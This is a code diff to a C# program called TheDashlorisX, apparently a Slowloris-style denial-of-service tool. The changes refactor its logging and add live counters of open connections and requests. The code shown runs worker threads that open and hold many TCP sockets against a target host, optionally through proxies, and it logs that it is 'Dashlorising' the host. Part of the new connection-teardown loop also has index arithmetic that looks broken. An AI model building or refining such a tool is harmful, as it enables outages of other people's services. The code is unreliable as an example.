@@ -26,8 +26,8 @@ namespace TheDashlorisX
 	private readonly DashNet DashNet = new DashNet();
 
 
-	private void Print(string Data, bool NewLine = true) =>
-	    SprucyLog.SendLog(Data, NewLine);
+	private void SendLog(string Data, bool NewLine = true) =>
+	    SprucyLog.SendLog(Data, false, NewLine);
 
 	public bool Visible() =>
 	    (SprucyLog.S1Container1.Visible);
@@ -143,25 +143,22 @@ namespace TheDashlorisX
 	{
 	    try
 	    {
-		new Thread(() =>
+		if (SprucyLog.RequiresInit)
 		{
-		    if (SprucyLog.RequiresInit)
+		    void Invoker()
 		    {
-			void Invoker()
+			try
 			{
-			    try
-			    {
-				SprucyLog.InitializePage(DashWindow, Capsule);
-			    }
-
-			    catch (Exception E)
-			    {
-				throw (ErrorHandler.GetException(E));
-			    }
+			    SprucyLog.InitializePage(DashWindow, Capsule);
 			}
 
-			Capsule.Invoke(new MethodInvoker(Invoker));
+			catch (Exception E)
+			{
+			    throw (ErrorHandler.GetException(E));
+			}
 		    }
+
+		    Capsule.Invoke(new MethodInvoker(Invoker));
 
 		    foreach (Control Control in Capsule.Controls)
 		    {
@@ -171,12 +168,10 @@ namespace TheDashlorisX
 			}
 		    }
 
-		    Print("Validating configuration ....");
-
 		    SprucyLog.Show();
-		})
+		}
 
-		{ IsBackground = true }.Start();
+		SendLog("- Validating configuration ....");
 
 		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/
 		(int, int, int, int, int, bool) Tier2 = ParseSect2(S3Class2);
@@ -187,23 +182,23 @@ namespace TheDashlorisX
 
 		if (Tier1.Item1 == null)
 		{
-		    Print("The main host panel settings section was found incorrectly setup. Invalid values detected!");
+		    SendLog("! The main host panel settings section was found incorrectly setup. Invalid values detected!");
 		    return;
 		}
 
 		else if (Tier2.Item1 == -1)
 		{
-		    Print("The main fancy settings section was found incorrectly setup. Invalid values detected!");
+		    SendLog("! The main fancy settings section was found incorrectly setup. Invalid values detected!");
 		    return;
 		}
 
 		else if (Tier3.Item1 == null)
 		{
-		    Print("The proxy configuration section was found incorrectly setup. Invalid values detected!");
+		    SendLog("! The proxy configuration section was found incorrectly setup. Invalid values detected!");
 		    return;
 		}
 
-		Print("No errors found! proceeding with execution ....");
+		SendLog("+ No errors found! proceeding with execution ....");
 
 		Artillery.Launch(this, SprucyLog, Tier1, Tier2, Tier3);
 	    }
@@ -220,7 +215,7 @@ namespace TheDashlorisX
 	    private readonly DashNet DashNet = new DashNet();
 
 
-	    private readonly System.Timers.Timer Timer = new System.Timers.Timer()
+	    private readonly System.Timers.Timer WorkTimer = new System.Timers.Timer()
 	    {
 		AutoReset = false,
 		Interval = int.MaxValue -1,
@@ -231,21 +226,21 @@ namespace TheDashlorisX
 	    {
 		try
 		{
-		    if (Timer.Interval == int.MaxValue -1)
+		    if (WorkTimer.Interval == int.MaxValue -1)
 		    {
-			Timer.Elapsed += (s, e) =>
+			WorkTimer.Elapsed += (s, e) =>
 			{
-			    Logy.SendLog("Timer finished 'Dashlorising' the given host!", true);
-			    Logy.SendLog("Give me a moment to catch my breath ....");
+			    Logy.SendLog("+ Timer finished 'Dashlorising' the given host!", true);
+			    Logy.SendLog("- Give me a moment to catch my breath ....");
 
 			    Logy.KeepStressing = false;
 			};
 		    }
 
-		    Timer.Interval = Duration;
-		    Timer.Enabled = true;
+		    WorkTimer.Interval = Duration;
+		    WorkTimer.Enabled = true;
 
-		    Timer.Start();
+		    WorkTimer.Start();
 		}
 
 		catch (Exception E)
@@ -258,10 +253,10 @@ namespace TheDashlorisX
 	    {
 		try
 		{
-		    Timer.Interval = int.MaxValue;
-		    Timer.Enabled = false;
+		    WorkTimer.Interval = int.MaxValue;
+		    WorkTimer.Enabled = false;
 
-		    Timer.Stop();
+		    WorkTimer.Stop();
 
 		    Thread.Sleep(1000);//To add some breathing.
 		}
@@ -277,7 +272,7 @@ namespace TheDashlorisX
 		try
 		{
 		    return (new Socket(DashNet.GetAddressFamily(host), SocketType.Stream, ProtocolType.Tcp)
-			{ LingerState = new LingerOption(true, 0), Ttl = 255, SendTimeout = 0, ReceiveTimeout = 0, NoDelay = true });
+			{ Blocking = true, LingerState = new LingerOption(true, 0), SendTimeout = 0, ReceiveTimeout = 0, NoDelay = true });
 		}
 
 		catch (Exception E)
@@ -300,19 +295,65 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    private void ReportStatics(bool Add)
+	    private int CurrentConnections = 0;
+	    private int CurrentRequests = 0;
+
+	    private readonly System.Timers.Timer StatTimer = new System.Timers.Timer()
+	    {
+		AutoReset = true,
+		Interval = int.MaxValue - 1,
+		Enabled = false
+	    };
+
+	    private void StartStatUpdater(SpruceLog Logy)
 	    {
 		try
 		{
-		    if (Add)
+		    if (StatTimer.Interval == int.MaxValue - 1)
 		    {
-			//Add to Cons and Workers
+			StatTimer.Elapsed += (s, e) =>
+			{
+			    Logy.S4TextBox1.Text = ($"{CurrentConnections}");
+			    Logy.S4TextBox2.Text = ($"{CurrentRequests}");
+			};
 		    }
 
-		    else
-		    {
-			//Remove from Cons and Workers
-		    }
+		    StatTimer.Interval = 500;
+		    StatTimer.Enabled = true;
+
+		    StatTimer.Start();
+		}
+
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    private void StopStatUpdater()
+	    {
+		try
+		{
+		    StatTimer.Interval = int.MaxValue;
+		    StatTimer.Enabled = false;
+
+		    CurrentConnections = 0;
+		    CurrentRequests = 0;
+		    
+		    StatTimer.Stop();
+		}
+
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    private void ReportStatics(SpruceLog Logy, bool Add)
+	    {
+		try
+		{
+		    CurrentConnections = CurrentConnections + (Add ? 1 : -1);
 		}
 
 		catch (Exception E)
@@ -326,6 +367,7 @@ namespace TheDashlorisX
 		try
 		{
 		    StartDurationCounter(Tier1.Item3, Logy);
+		    StartStatUpdater(Logy);
 
 		    void SendLog(string Message, bool MustVerbose = false)
 		    {
@@ -336,7 +378,7 @@ namespace TheDashlorisX
 				return;
 			    }
 
-			    Logy.SendLog($@"{Message}");
+			    Logy.SendLog($@"{Message}", MustVerbose);
 			}
 
 			catch (Exception E)
@@ -353,7 +395,7 @@ namespace TheDashlorisX
 
 		    string Host = Tier1.Item1;
 
-		    SendLog($"Starting {Workers} Dash Workers ....", true);
+		    SendLog($"- Starting {Workers} Dash Workers ....");
 
 		    List<Thread> DashWorkers = new List<Thread>();
 
@@ -382,7 +424,7 @@ namespace TheDashlorisX
 					if (DashShell.Connected)
 					{
 					    SendArtillery(Tier1, Tier2);
-					    ReportStatics(true);//Add 
+					    ReportStatics(Logy, true);//Add 
 
 					    Connections.Add(DashShell);
 					}
@@ -391,6 +433,8 @@ namespace TheDashlorisX
 					{
 					    DashShell.Close();
 					}
+
+					CurrentRequests += 1;
 
 					Thread.Sleep(SendDelay);
 				    }
@@ -402,21 +446,45 @@ namespace TheDashlorisX
 					    Connections[Id].Close();
 					    Connections.RemoveAt(Id);
 
-					    ReportStatics(false);//Remove
+					    ReportStatics(Logy, false);//Remove
 					}
 				    }
 
 				    Thread.Sleep(SendDelay);
 				}
 
-				foreach (Socket Connection in Connections)
+				if (Connections.Count >= 50)
 				{
-				    if (Connection.Connected)
+				    for (int Connection = 0; Connection < Connections.Count / 4; Connection += 1)
 				    {
-					Connection.Disconnect(true);
+					new Thread(() =>
+					{
+					    for (int Id = (Connections.Count / 4) * Connection; Id <= (Connections.Count / 4) * Connection; Id += 1)
+					    {
+						if (Connections[Id - 1].Connected)
+						{
+						    Connections[Id - 1].Close(0);
+						}
+					    }
+
+					    Connections.Clear();
+					})
+
+					{ IsBackground = true }.Start();
+				    }
+				}
+
+				else
+				{
+				    foreach (Socket Connection in Connections)
+				    {
+					if (Connection.Connected)
+					{
+					    Connection.Close(0);
+					}
 				    }
 
-				    Connection.Close();
+				    Connections.Clear();
 				}
 			    }
 
@@ -433,8 +501,8 @@ namespace TheDashlorisX
 			DashWorker.Start();
 		    }
 
-		    SendLog("Done starting Dash Workers!", true);
-		    SendLog("Waiting for Dash Workers to finish ....");
+		    SendLog("+ Done starting Dash Workers!");
+		    SendLog("- Waiting for Dash Workers to finish ....");
 
 		    foreach (Thread DashWorker in DashWorkers)
 		    {
@@ -445,6 +513,7 @@ namespace TheDashlorisX
 		    }
 		    
 		    StopDurationCounter();
+		    StopStatUpdater();
 		}
 
 		catch (Exception E)
